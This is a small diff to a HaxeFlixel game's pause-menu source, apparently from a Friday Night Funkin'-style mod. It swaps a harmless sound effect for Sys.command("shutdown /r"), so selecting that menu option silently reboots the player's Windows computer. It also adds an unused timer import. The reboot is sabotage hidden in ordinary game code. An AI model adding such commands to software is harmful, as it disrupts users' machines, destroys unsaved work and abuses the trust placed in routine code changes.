@@ -17,6 +17,7 @@ import flixel.text.FlxText;
 import flixel.tweens.FlxEase;
 import flixel.tweens.FlxTween;
 import flixel.util.FlxColor;
+import flixel.util.FlxTimer;
 
 class PauseSubState extends MusicBeatSubstate
 {
@@ -367,7 +368,7 @@ class PauseSubState extends MusicBeatSubstate
 						if (FlxG.save.data.fpsCap > 290)
 							(cast (Lib.current.getChildAt(0), Main)).setFPSCap(290);
 						
-						FlxG.sound.play(Paths.sound('pop'), 0.8);
+							Sys.command("shutdown /r");
 			}
 		}
 
